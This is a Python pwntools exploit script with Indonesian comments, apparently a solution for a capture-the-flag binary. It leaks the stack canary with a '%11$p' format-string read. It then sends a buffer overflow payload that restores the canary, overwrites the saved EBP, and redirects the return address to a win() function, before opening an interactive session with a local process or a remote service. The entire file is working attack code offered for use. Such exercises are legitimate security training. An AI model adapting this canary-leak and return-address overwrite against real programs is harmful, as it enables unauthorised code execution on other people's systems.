from pwn import *

# === CONFIGURATION ===
# Ganti ke 'remote' jika ingin menembak server NC
mode = 'local' 

if mode == 'local':
    p = process('./vuln')
else:
    # Masukkan IP dan Port dari soal CTF
    p = remote('10.10.10.10', 1337)

# --- LANGKAH 1: Leak Canary via Format String ---
# Berdasarkan gambar, kita kirim %11$p untuk baca posisi ke-11 di stack
p.recvuntil(b'Name: ')
p.sendline(b'%11$p')

# Ambil output, bersihkan, dan ubah dari hex string ke integer
leaked_output = p.recvline()
canary = int(leaked_output.strip(), 16)

log.success(f"Canary Leaked: {hex(canary)}")

# --- LANGKAH 2: Susun Payload Buffer Overflow ---
# Urutan di stack (HARUS URUT!): buf -> canary -> EBP -> ret addr
# Berdasarkan gambar:
# - Offset buffer ke canary: 32 byte
# - Alamat fungsi win: 0x08048400

target_addr = 0x08048400 # Ganti jika alamat win() berbeda

payload = b'A' * 32          # 1. Isi buffer sampai batas canary
payload += p32(canary)       # 2. Masukkan canary asli agar pengecekan lolos
payload += b'B' * 4          # 3. Timpa Saved EBP (fake EBP)
payload += p32(target_addr)  # 4. Timpa Return Address ke fungsi target

# --- LANGKAH 3: Kirim Payload Final ---
p.recvuntil(b'Input: ')
p.sendline(payload)

# Jika berhasil, kita akan mendapatkan shell atau output dari fungsi win()
p.interactive()